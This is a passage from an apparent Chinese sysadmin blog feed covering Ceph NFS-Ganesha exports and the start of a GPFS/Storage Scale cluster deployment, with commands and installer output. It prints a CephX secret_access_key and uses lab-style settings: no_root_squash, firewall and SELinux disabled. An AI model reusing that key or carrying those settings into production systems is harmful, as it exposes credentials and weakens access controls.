cephfs<br><br><span class="hljs-comment"># 创建 cephfs subvolume</span><br>ceph fs subvolume create cephfs subvolume02<br><br><span class="hljs-comment"># 查看 cephfs subvolume 信息</span><br>ceph fs subvolume info cephfs subvolume02<br><br><span class="hljs-comment"># 创建 nfs 服务集群</span><br><span class="hljs-comment"># 如果不指定端口，则默认为 2049，这会导致同一机器上无法部署多个 nfs 服务</span><br>ceph nfs cluster create service02 host02 --port 2052<br><br><span class="hljs-comment"># 创建 nfs export</span><br>ceph nfs <span class="hljs-built_in">export</span> create cephfs service02 /cephfs02 cephfs /volumes/_nogroup/subvolume02/caa3eab9-cadf-42d5-91d4-85d710b19f47 --squash no_root_squash<br><br><span class="hljs-comment"># 查看 nfs 服务集群列表</span><br>ceph nfs cluster <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看 nfs 服务集群配置</span><br>ceph nfs cluster info service02<br><br><span class="hljs-comment"># 查看 nfs export 列表</span><br>ceph nfs <span class="hljs-built_in">export</span> <span class="hljs-built_in">ls</span> service02<br><br><span class="hljs-comment"># 查看 nfs export 详细信息</span><br>ceph nfs <span class="hljs-built_in">export</span> info service02 /cephfs02<br><br><span class="hljs-comment"># 移除 nfs 服务集群</span><br>ceph nfs cluster delete service02<br></code></pre></td></tr></table></figure><p><strong>其中一个 nfs 容器内部的配置文件如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf"># This file is generated by cephadm.<br>NFS_CORE_PARAM &#123;<br>    Enable_NLM = false;<br>    Enable_RQUOTA = false;<br>    Protocols = 4;<br>    NFS_Port = 2049;<br>&#125;<br><br>NFSv4 &#123;<br>    Delegations = false;<br>    RecoveryBackend = &#x27;rados_cluster&#x27;;<br>    Minor_Versions = 1, 2;<br>    IdmapConf = &quot;/etc/ganesha/idmap.conf&quot;;<br>&#125;<br><br>RADOS_KV &#123;<br>    UserId = &quot;nfs.service01.1.0.host01.fnrbmo&quot;;<br>    nodeid = &quot;nfs.service01.1&quot;;<br>    pool = &quot;.nfs&quot;;<br>    namespace = &quot;service01&quot;;<br>&#125;<br><br>RADOS_URLS &#123;<br>    UserId = &quot;nfs.service01.1.0.host01.fnrbmo&quot;;<br>    watch_url = &quot;rados://.nfs/service01/conf-nfs.service01&quot;;<br>&#125;<br><br>RGW &#123;<br>    cluster = &quot;ceph&quot;;<br>    name = &quot;client.nfs.service01.1.0.host01.fnrbmo-rgw&quot;;<br>&#125;<br><br>%url    rados://.nfs/service01/conf-nfs.service01<br></code></pre></td></tr></table></figure><p><strong>从上面的配置文件中可以看出，具体的导出配置应该存储于对应的对象中，尝试查看对应的对象内容如下:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@host01 yum.repos.d]# rados --pool .nfs --namespace service01 <span class="hljs-built_in">ls</span><br>grace<br>rec-0000000000000004:nfs.service01.2<br>export-1<br>conf-nfs.service01<br>rec-0000000000000004:nfs.service01.1<br>rec-0000000000000004:nfs.service01.0<br><br>[root@host01 yum.repos.d]# rados --pool .nfs --namespace service01 get conf-nfs.service01 -<br>%url <span class="hljs-string">&quot;rados://.nfs/service01/export-1&quot;</span><br><br>[root@host01 yum.repos.d]# rados --pool .nfs --namespace service01 get export-1 -<br>EXPORT &#123;<br>    FSAL &#123;<br>        name = <span class="hljs-string">&quot;CEPH&quot;</span>;<br>        user_id = <span class="hljs-string">&quot;nfs.service01.cephfs.e2862403&quot;</span>;<br>        filesystem = <span class="hljs-string">&quot;cephfs&quot;</span>;<br>        secret_access_key = <span class="hljs-string">&quot;AQAAyZFoEXzfFxAAuJYXQhk7pngckw/I6AK2cw==&quot;</span>;<br>        cmount_path = <span class="hljs-string">&quot;/&quot;</span>;<br>    &#125;<br>    export_id = 1;<br>    path = <span class="hljs-string">&quot;/volumes/_nogroup/subvolume01/e61f84b7-b1ca-493b-8d64-cf5a84dd2377&quot;</span>;<br>    pseudo = <span class="hljs-string">&quot;/cephfs01&quot;</span>;<br>    access_type = <span class="hljs-string">&quot;RW&quot;</span>;<br>    squash = <span class="hljs-string">&quot;no_root_squash&quot;</span>;<br>    attr_expiration_time = 0;<br>    security_label = <span class="hljs-literal">false</span>;<br>    protocols = 3, 4;<br>    transports = <span class="hljs-string">&quot;TCP&quot;</span>, <span class="hljs-string">&quot;UDP&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-2、挂载客户端"><a href="#2-3-2、挂载客户端" class="headerlink" title="2.3.2、挂载客户端"></a>2.3.2、挂载客户端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载客户端</span><br><span class="hljs-comment"># 注意: 这里的 /cephfs01 要与配置的 pseudo 保持一致</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs-nfs<br>mount -t nfs4 -o nfsvers=4.1,proto=tcp,rw 10.10.0.1:/cephfs01 /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 查看挂载目录的数据</span><br><span class="hljs-built_in">ls</span> -al /mnt/cephfs-nfs<br><br><span class="hljs-comment"># 读写测试</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/cephfs-nfs/testfile3 oflag=direct status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/cephfs-nfs/testfile3 bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 取消挂载</span><br>umount /mnt/cephfs-nfs<br></code></pre></td></tr></table></figure><h1 id="三、参考资料"><a href="#三、参考资料" class="headerlink" title="三、参考资料"></a>三、参考资料</h1><ul><li><a href="https://ceph.io/en/news/blog/2021/managing-nfs-exports-with-dashboard">https://ceph.io/en/news/blog/2021/managing-nfs-exports-with-dashboard</a></li><li><a href="https://docs.ceph.com/en/pacific/cephfs/nfs">https://docs.ceph.com/en/pacific/cephfs/nfs</a></li><li><a href="https://docs.ceph.com/en/latest/cephfs/nfs">https://docs.ceph.com/en/latest/cephfs/nfs</a></li><li><a href="https://docs.ceph.com/en/pacific/mgr/nfs">https://docs.ceph.com/en/pacific/mgr/nfs</a></li><li><a href="https://docs.ceph.com/en/latest/mgr/nfs">https://docs.ceph.com/en/latest/mgr/nfs</a></li><li><a href="https://github.com/nfs-ganesha/nfs-ganesha">https://github.com/nfs-ganesha/nfs-ganesha</a></li><li><a href="https://github.com/nfs-ganesha/nfs-ganesha/blob/next/src/config_samples/export.txt">https://github.com/nfs-ganesha/nfs-ganesha/blob/next/src/config_samples/export.txt</a></li><li><a href="https://www.ibm.com/docs/zh/storage-ceph/6.1.0?topic=preview-implementing-ha-cephfsnfs-service-technology">https://www.ibm.com/docs/zh/storage-ceph/6.1.0?topic=preview-implementing-ha-cephfsnfs-service-technology</a></li><li><a href="https://www.cnblogs.com/flytor/p/11430490.html">https://www.cnblogs.com/flytor/p/11430490.html</a></li><li><a href="https://blog.csdn.net/qq_20332637/article/details/107796651">https://blog.csdn.net/qq_20332637/article/details/107796651</a></li><li><a href="https://blog.csdn.net/weixin_42071407/article/details/125447826">https://blog.csdn.net/weixin_42071407/article/details/125447826</a></li><li><a href="https://blog.csdn.net/younger_china/article/details/73412191">https://blog.csdn.net/younger_china/article/details/73412191</a></li><li><a href="https://blog.csdn.net/u012720518/article/details/125760224">https://blog.csdn.net/u012720518/article/details/125760224</a></li><li><a href="https://blog.csdn.net/eagle89/article/details/111661142">https://blog.csdn.net/eagle89/article/details/111661142</a></li><li><a href="https://cloud.tencent.com/developer/news/841204">https://cloud.tencent.com/developer/news/841204</a></li><li><a href="https://blog.csdn.net/ycnian/article/details/8515517">https://blog.csdn.net/ycnian/article/details/8515517</a></li><li><a href="https://github.com/nfs-ganesha/nfs-ganesha/blob/next/src/doc/USEFUL-RFCs.txt">https://github.com/nfs-ganesha/nfs-ganesha/blob/next/src/doc/USEFUL-RFCs.txt</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPFS 集群部署与运维记录</title>
      <link href="/2024/08/01/gpfs/"/>
      <url>/2024/08/01/gpfs/</url>
      
        <content type="html"><![CDATA[<h1 id="一、GPFS-介绍"><a href="#一、GPFS-介绍" class="headerlink" title="一、GPFS 介绍"></a>一、GPFS 介绍</h1><p>IBM GPFS (General Parallel File System ,GPFS)是一款并行的文件系统，它保证在资源组内的所有节点可以并行访问整个文件系统，而且针对此文件系统的服务操作，可以同时安全地在此文件系统的多个节点上实现。GPFS 允许客户共享文件，而这些文件可能分布在不同节点的不同硬盘上，保证了数据的一致性和完整性。GPFS支持多种平台的部署，如Windows、Linux、AIX，每种环境部署方式相同，降低了软件部署的复杂度。</p><h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p><strong>环境拓扑介绍:</strong></p><table><thead><tr><th align="center">节点名称</th><th align="center">节点IP</th><th align="center">节点角色</th></tr></thead><tbody><tr><td align="center">node01</td><td align="center">10.10.0.1</td><td align="center">Server，GUI(Dashboard)</td></tr><tr><td align="center">node02</td><td align="center">10.10.0.2</td><td align="center">Server，GUI(Dashboard)，CES</td></tr><tr><td align="center">node03</td><td align="center">10.10.0.3</td><td align="center">Server，CES</td></tr></tbody></table><p><strong>相关操作步骤如下:</strong></p><ul><li><code>配置 /etc/hosts</code> : 用于节点间的 hostname 相互识别；</li><li><code>配置 ssh 免密登录</code> : 用于节点间的相互通信；</li><li><code>关闭防火墙和 selinux</code> : 避免网络问题导致节点间通信异常；</li><li><code>配置时间同步</code> : 避免时钟不同步，导致节点间通信等其他异常；</li><li><code>安装依赖包</code> : 运行 gpfs 的基础依赖软件；</li></ul><h2 id="2-1、配置-etc-hosts"><a href="#2-1、配置-etc-hosts" class="headerlink" title="2.1、配置 &#x2F;etc&#x2F;hosts"></a>2.1、配置 &#x2F;etc&#x2F;hosts</h2><p>确保每个 server&#x2F;client 节点上均配置如下的 hosts 记录。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/hosts<br>10.10.0.1 node01<br>10.10.0.2 node02<br>10.10.0.3 node03<br></code></pre></td></tr></table></figure><h2 id="2-2、配置-ssh-免密登录"><a href="#2-2、配置-ssh-免密登录" class="headerlink" title="2.2、配置 ssh 免密登录"></a>2.2、配置 ssh 免密登录</h2><p>确保每个 server 间可以实现 ssh 免密访问，同时任意 server 节点均可免密访问 client 节点。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># node01</span><br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node02<br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node03<br><br><span class="hljs-comment"># node02</span><br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node01<br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node03<br><br><span class="hljs-comment"># node03</span><br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node01<br>ssh-copy-id -f -i /root/.ssh/id_rsa.pub root@node02<br><br><span class="hljs-comment"># 测试连接，分别位于不同的机器执行测试</span><br>ssh root@node01<br>ssh root@node02<br>ssh root@node03<br></code></pre></td></tr></table></figure><h2 id="2-3、关闭防火墙和-selinux"><a href="#2-3、关闭防火墙和-selinux" class="headerlink" title="2.3、关闭防火墙和 selinux"></a>2.3、关闭防火墙和 selinux</h2><p><strong>相关命令:</strong> （以下操作需要在每个 server&#x2F;client 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 关闭防火墙并禁止开机启动</span><br>systemctl stop firewalld<br>systemctl <span class="hljs-built_in">disable</span> firewalld<br><br><span class="hljs-comment"># 关闭 selinux</span><br><span class="hljs-comment"># 将 SELINUX=enforcing 改为 SELINUX=disabled</span><br><span class="hljs-comment"># 重启后生效</span><br>vi /etc/selinux/config<br><span class="hljs-built_in">cat</span> /etc/selinux/config<br></code></pre></td></tr></table></figure><h2 id="2-4、配置时间同步"><a href="#2-4、配置时间同步" class="headerlink" title="2.4、配置时间同步"></a>2.4、配置时间同步</h2><p><strong>相关命令:</strong> （以下操作需要在每个 server&#x2F;client 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启动时间同步并设置开机启动</span><br>systemctl start chronyd<br>systemctl <span class="hljs-built_in">enable</span> chronyd<br><br><span class="hljs-comment"># 检查同步状态</span><br>chronyc tracking<br></code></pre></td></tr></table></figure><h2 id="2-5、安装依赖包"><a href="#2-5、安装依赖包" class="headerlink" title="2.5、安装依赖包"></a>2.5、安装依赖包</h2><p><strong>相关命令:</strong> （以下操作需要在每个 server&#x2F;client 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dnf install -y ksh m4 kernel-devel kernel-devel-$(<span class="hljs-built_in">uname</span> -r) kernel-headers gcc-c++ python3 net-tools perl-Thread-Queue<br></code></pre></td></tr></table></figure><h1 id="三、集群部署"><a href="#三、集群部署" class="headerlink" title="三、集群部署"></a>三、集群部署</h1><p>本次集群部署的软件包版本为 <code>5.1.8.1</code> ，完整的软件包名为 <code>Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install</code> 。</p><p><strong>集群部署的关键步骤如下:</strong></p><ul><li>解压并安装软件包 : </li><li>修改环境变量 : </li><li>构建GPFS可移植层 :</li><li>创建集群 : </li><li>创建NSD :</li><li>创建文件系统 :</li><li>挂载文件系统 : </li><li>配置Dashboard（可选） : </li><li>配置CES（可选） :</li></ul><h2 id="3-1、解压并安装软件包"><a href="#3-1、解压并安装软件包" class="headerlink" title="3.1、解压并安装软件包"></a>3.1、解压并安装软件包</h2><p>如果你是为了开发测试使用，你可以访问 <a href="https://www.ibm.com/products/storage-scale">IBM Storage Scale</a> 官方，注册一个账户，之后签署协议，下载对应的开发者版本的软件包。在下面的示例页面中，就可以下载对应的软件包。在这次的测试中，我们并没有使用对应的开发者版本的软件包，而是使用本地生产环境使用的软件包。</p><p><img src="/./assets/images/gpfs-download-dev.png" alt="Storage_Scale_Developer-5.2.3.2-x86_64-Linux.zip" loading="lazy"></p><h3 id="3-1-1、解压并安装软件包"><a href="#3-1-1、解压并安装软件包" class="headerlink" title="3.1.1、解压并安装软件包"></a>3.1.1、解压并安装软件包</h3><p><strong>相关命令:</strong> （以下操作需要在每个 server 节点上执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解压软件包</span><br><span class="hljs-built_in">chmod</span> +x Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install<br>./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install --<span class="hljs-built_in">help</span><br><br><br><span class="hljs-comment"># 解压软件包，默认安装文件会被解压到 /usr/lpp/mmfs/5.1.8.1 目录下</span><br><span class="hljs-comment"># 不同操作的含义:</span><br><span class="hljs-comment">#     输入 1 : 接受协议（输入 1 后继续安装操作）</span><br><span class="hljs-comment">#     输入 2 : 拒绝协议</span><br><span class="hljs-comment">#     输入 3 : 打印协议</span><br><span class="hljs-comment">#     输入 4 : 阅读非 IBM 条款</span><br><span class="hljs-comment">#     输入 99 : 返回上一屏幕</span><br>./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install --text-only<br><br><span class="hljs-comment"># 安装软件包</span><br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/gpfs_rpms/<br>rpm -ivh gpfs.base-5.1.8-1.x86_64.rpm<br>rpm -ivh gpfs.compression-5.1.8-1.x86_64.rpm<br>rpm -ivh gpfs.docs-5.1.8-1.noarch.rpm<br>rpm -ivh gpfs.gpl-5.1.8-1.noarch.rpm<br>rpm -ivh gpfs.gskit-8.0.55-19.1.x86_64.rpm<br>rpm -ivh gpfs.java-5.1.8-1.x86_64.rpm<br>rpm -ivh gpfs.license.da-5.1.8-1.x86_64.rpm<br>rpm -ivh gpfs.msg.en_US-5.1.8-1.noarch.rpm<br><span class="hljs-built_in">cd</span> /usr/lpp/mmfs/5.1.8.1/zimon_rpms/rhel8/<br>rpm -ivh gpfs.gss.pmcollector-5.1.8-1.el8.x86_64.rpm<br>rpm -ivh gpfs.gss.pmsensors-5.1.8-1.el8.x86_64.rpm<br>rpm -ivh gpfs.pm-ganesha-10.0.0-2.el8.x86_64.rpm<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# ./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install --text-only<br><br>Extracting License Acceptance Process Tool to /usr/lpp/mmfs/5.1.8.1 ...<br><span class="hljs-built_in">tail</span> -n +660 ./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install | tar -C /usr/lpp/mmfs/5.1.8.1 -xvz --exclude=installer --exclude=*_rpms --exclude=*_debs --exclude=*rpm  --exclude=*tgz --exclude=*deb --exclude=*tools* 1&gt; /dev/null<br><br>Installing JRE ...<br><br>If directory /usr/lpp/mmfs/5.1.8.1 has been created or was previously created during another extraction,<br>.rpm, .deb, and repository related files <span class="hljs-keyword">in</span> it (<span class="hljs-keyword">if</span> there were) will be removed to avoid conflicts with the ones being extracted.<br><br><span class="hljs-built_in">tail</span> -n +660 ./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install | tar -C /usr/lpp/mmfs/5.1.8.1 --wildcards -xvz  ibm-java*tgz 1&gt; /dev/null<br>tar -C /usr/lpp/mmfs/5.1.8.1/ -xzf /usr/lpp/mmfs/5.1.8.1/ibm-java*tgz<br><br>Invoking License Acceptance Process Tool ...<br>/usr/lpp/mmfs/5.1.8.1/ibm-java-x86_64-80/jre/bin/java -<span class="hljs-built_in">cp</span> /usr/lpp/mmfs/5.1.8.1/LAP_HOME/LAPApp.jar com.ibm.lex.lapapp.LAP -l /usr/lpp/mmfs/5.1.8.1/LA_HOME -m /usr/lpp/mmfs/5.1.8.1 -s /usr/lpp/mmfs/5.1.8.1  -text_only<br><br>LICENSE INFORMATION<br><br>The Programs listed below are licensed under the following<br>License Information terms and conditions <span class="hljs-keyword">in</span> addition to the<br>Program license terms previously agreed to by Client and<br>IBM. If Client does not have previously agreed to license<br>terms <span class="hljs-keyword">in</span> effect <span class="hljs-keyword">for</span> the Program, the International Program<br>License Agreement (i125-3301-15) applies.<br><br>Program Name (Program Number):<br>IBM Storage Scale Erasure Code Edition 5.1.8.1 (5737-J34)<br>IBM Storage Scale Data Management Edition 5.1.8.1 (5737-F34)<br>IBM Storage Scale Data Management Edition 5.1.8.1 (5641-DM1)<br>IBM Storage Scale Data Management Edition 5.1.8.1 (5641-DM3)<br><br>Press Enter to <span class="hljs-built_in">continue</span> viewing the license agreement, or<br>enter <span class="hljs-string">&quot;1&quot;</span> to accept the agreement, <span class="hljs-string">&quot;2&quot;</span> to decline it, <span class="hljs-string">&quot;3&quot;</span><br>to <span class="hljs-built_in">print</span> it, <span class="hljs-string">&quot;4&quot;</span> to <span class="hljs-built_in">read</span> non-IBM terms, or <span class="hljs-string">&quot;99&quot;</span> to go back<br>to the previous screen.<br>1<br><br>License Agreement Terms accepted.<br><br>Extracting Product RPMs to /usr/lpp/mmfs/5.1.8.1 ...<br><span class="hljs-built_in">tail</span> -n +660 ./Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install | tar -C /usr/lpp/mmfs/5.1.8.1 --wildcards -xvz  Public_Keys ansible-toolkit cloudkit/dependencies ganesha_debs/ubuntu/ubuntu20 ganesha_debs/ubuntu/ubuntu22 gpfs_debs/ubuntu/ubuntu20 gpfs_debs/ubuntu/ubuntu22 hdfs_rpms/rhel/hdfs_3.1.1.x hdfs_rpms/rhel/hdfs_3.2.2.x hdfs_rpms/rhel/hdfs_3.3.x smb_debs/ubuntu/ubuntu20 smb_debs/ubuntu/ubuntu22 zimon_debs/ubuntu/ubuntu20 zimon_debs/ubuntu/ubuntu22 ganesha_rpms/rhel7 ganesha_rpms/rhel8 ganesha_rpms/rhel9 ganesha_rpms/sles15 gpfs_rpms/rhel7 gpfs_rpms/rhel8 gpfs_rpms/rhel9 gpfs_rpms/sles15 object_rpms/rhel8 smb_rpms/rhel7 smb_rpms/rhel8 smb_rpms/rhel9 smb_rpms/sles15 tools/repo zimon_debs/ubuntu zimon_rpms/rhel7 zimon_rpms/rhel8 zimon_rpms/rhel9 zimon_rpms/sles15 cloudkit gpfs_debs gpfs_rpms manifest 1&gt; /dev/null<br>   - Public_Keys<br>   - ansible-toolkit<br>   - cloudkit/dependencies<br>   - ganesha_debs/ubuntu/ubuntu20<br>   - ganesha_debs/ubuntu/ubuntu22<br>   - gpfs_debs/ubuntu/ubuntu20<br>   - gpfs_debs/ubuntu/ubuntu22<br>   - hdfs_rpms/rhel/hdfs_3.1.1.x<br>   - hdfs_rpms/rhel/hdfs_3.2.2.x<br>   - hdfs_rpms/rhel/hdfs_3.3.x<br>   - smb_debs/ubuntu/ubuntu20<br>   - smb_debs/ubuntu/ubuntu22<br>   - zimon_debs/ubuntu/ubuntu20<br>   - zimon_debs/ubuntu/ubuntu22<br>   - ganesha_rpms/rhel7<br>   - ganesha_rpms/rhel8<br>   - ganesha_rpms/rhel9<br>   - ganesha_rpms/sles15<br>   - gpfs_rpms/rhel7<br>   - gpfs_rpms/rhel8<br>   - gpfs_rpms/rhel9<br>   - gpfs_rpms/sles15<br>   - object_rpms/rhel8<br>   - smb_rpms/rhel7<br>   - smb_rpms/rhel8<br>   - smb_rpms/rhel9<br>   - smb_rpms/sles15<br>   - tools/repo<br>   - zimon_debs/ubuntu<br>   - zimon_rpms/rhel7<br>   - zimon_rpms/rhel8<br>   - zimon_rpms/rhel9<br>   - zimon_rpms/sles15<br>   - cloudkit<br>   - gpfs_debs<br>   - gpfs_rpms<br>   - manifest<br><br>Removing License Acceptance Process Tool from /usr/lpp/mmfs/5.1.8.1 ...<br><span class="hljs-built_in">rm</span> -rf  /usr/lpp/mmfs/5.1.8.1/LAP_HOME /usr/lpp/mmfs/5.1.8.1/LA_HOME<br><br>Removing JRE from /usr/lpp/mmfs/5.1.8.1 ...<br><span class="hljs-built_in">rm</span> -rf /usr/lpp/mmfs/5.1.8.1/ibm-java*tgz<br><br>==================================================================<br>Product packages successfully extracted to /usr/lpp/mmfs/5.1.8.1<br><br>   Cluster installation and protocol deployment<br>      To install a cluster or deploy protocols with the IBM Storage Scale Installation Toolkit:<br>      /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale -h<br><br>      To install a cluster manually:  Use the GPFS packages located within /usr/lpp/mmfs/5.1.8.1/gpfs_&lt;rpms/debs&gt;<br><br>      To upgrade an existing cluster using the IBM Storage Scale Installation Toolkit:<br>      1) Review and update the config:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale config update<br>      2) Update the cluster configuration to reflect the current cluster config:<br>         /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale config populate -N &lt;node&gt;<br>      3) Use online or offline upgrade depending on your requirements:<br>         - Run the online rolling upgrade:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale upgrade -h<br>         - Run the offline upgrade: /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale upgrade config offline -N;<br>               /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale upgrade run<br>      You can also run the parallel offline upgrade to upgrade all nodes parallely after shutting down GPFS<br>      and stopping protocol services on all nodes.<br>      You can run the parallel offline upgrade on all nodes <span class="hljs-keyword">in</span> the cluster, not on a subset of nodes.<br><br>      To add nodes to an existing cluster using the IBM Storage Scale Installation Toolkit:<br>      1) Add nodes to the cluster definition file:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale node add -h<br>      2) Install IBM Storage Scale on the new nodes:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale install -h<br>      3) Deploy protocols on the new nodes:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale deploy -h<br><br>      To add NSDs or file systems to an existing cluster using the IBM Storage Scale Installation Toolkit:<br>      1) Add NSDs or file systems to the cluster definition:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale nsd add -h<br>      2) Install the NSDs or file systems:  /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale install -h<br><br><br>      To update the cluster definition to reflect the current cluster config examples:<br>         /usr/lpp/mmfs/5.1.8.1/ansible-toolkit/spectrumscale config populate -N &lt;node&gt;<br>      1) Manual updates outside of the installation toolkit<br>      2) Sync the current cluster state to the installation toolkit prior to upgrade<br>      3) Switching from a manually managed cluster to the installation toolkit<br><br>===================================================================================<br>To get up and running quickly, consult the IBM Storage Scale Protocols Quick Overview:<br>https://www.ibm.com/docs/en/STXKQY_5.1.8/pdf/scale_povr.pdf<br>===================================================================================<br><br>[root@node01 data]# ll /usr/lpp/mmfs/5.1.8.1<br>total 40<br>drwxr-xr-x 11 root root   226 Jul 19  2023 ansible-toolkit<br>drwxr-xr-x  3 root root    42 Jul 19  2023 cloudkit<br>drwxr-xr-x  3 root root    20 Jun 19 21:10 ganesha_debs<br>drwxr-xr-x  6 root root    59 Jun 19 21:10 ganesha_rpms<br>drwxr-xr-x  3 root root  4096 Jul 19  2023 gpfs_debs<br>drwxr-xr-x  7 root root  4096 Jul 19  2023 gpfs_rpms<br>drwxr-xr-x  3 root root    18 Jun 19 21:10 hdfs_rpms<br>drwxr-xr-x  3 root root  4096 Jun 19 21:10 license<br>-rw-r--r--  1 root root 25195 Jul 19  2023 manifest<br>drwxr-xr-x  3 root root    19 Jun 19 21:10 object_rpms<br>drwxr-xr-x  2 root root    76 Jul 19  2023 Public_Keys<br>drwxr-xr-x  3 root root    20 Jun 19 21:10 smb_debs<br>drwxr-xr-x  6 root root    59 Jun 19 21:10 smb_rpms<br>drwxr-xr-x  3 root root    18 Jun 19 21:10 tools<br>drwxr-xr-x  3 root root    20 Jun 19 21:10 zimon_debs<br>drwxr-xr-x  6 root root    59 Jun 19 21:10 zimon_rpms<br></code></pre></td></tr></table></figure><h3 id="3-1-2、仅解压软件包"><a href="#3-1-2、仅解压软件包" class="headerlink" title="3.1.2、仅解压软件包"></a>3.1.2、仅解压软件包</h3><p>如果我们只想要简单的解压对应的文件，并查看其中的文件列表，而不执行安装操作，可以使用 <a href="https://sparanoid.com/lab/7z/download.html">7zip</a> 软件来执行解压操作。</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载并安装 7z 软件</span><br><span class="hljs-built_in">mkdir</span> ./7z<br>wget https://www.7-zip.org/a/7z2409-linux-x64.tar.xz<br>tar -xvf 7z2409-linux-x64.tar.xz -C ./7z<br><span class="hljs-built_in">cp</span> ./7z/7zz* /usr/bin/<br><span class="hljs-built_in">rm</span> -rf ./7z 7z2409-linux-x64.tar.xz<br><br><span class="hljs-comment"># 解压 GPFS 压缩包到当前目录的 gpfs 目录中， 如果 gpfs 目录不存在则自动创建</span><br>7zz x Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install -o./gpfs<br>7zz x ./gpfs/Storage_Scale_Data_Access-5.1.8 -o./gpfs<br><br><span class="hljs-comment"># 查看目录结构</span><br>tree ./gpfs/ -L 1<br></code></pre></td></tr></table></figure><p><strong>相关输出信息:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@node01 data]# 7zz x Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install -o./gpfs<br><br>7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-28<br> 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 1234441464 bytes (1178 MiB)<br><br>Extracting archive: Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install<br>--<br>Path = Storage_Scale_Data_Access-5.1.8.1-x86_64-Linux-install<br>Type = gzip<br>Offset = 24036<br>Physical Size = 1234417428<br>Headers Size = 10<br>Streams = 1<br><br>Everything is Ok<br><br>Size:       1508546560<br>Compressed: 1234441464<br><br><br>[root@node01 data]# 7zz x ./gpfs/Storage_Scale_Data_Access-5.1.8 -o./gpfs<br><br>7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-28<br> 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM<br><br>Scanning the drive <span class="hljs-keyword">for</span> archives:<br>1 file, 1508546560 bytes (1439 MiB)<br><br>Extracting archive: Storage_Scale_Data_Access-5.1.8<br>--<br>Path = Storage_Scale_Data_Access-5.1.8<br>Type = tar<br>Physical Size = 1508546560<br>Headers Size = 2147328<br>Code Page = UTF-8<br>Characteristics = GNU LongName ASCII<br><br>Everything is Ok<br><br>Folders: 702<br>Files: 2522<br>Size:       1505726177<br>Compressed: 1508546560<br><br><br>[root@node01 data]# tree ./gpfs/ -L 1<br>./gpfs/<br>├── ansible-toolkit<br>├── cloudkit<br>├── ganesha_debs<br>├── ganesha_rpms<br>├── gpfs_debs<br>├── gpfs_rpms<br>├── hdfs_rpms<br>├── ibm-java-jre-8.0-5.11-linux-x86_64.tgz<br>├── LA_HOME<br>├── LAP_HOME<br>├── manifest<br>├── object_rpms<br>├── Public_Keys<br>├── smb_debs<br>├── smb_rpms<br>├── 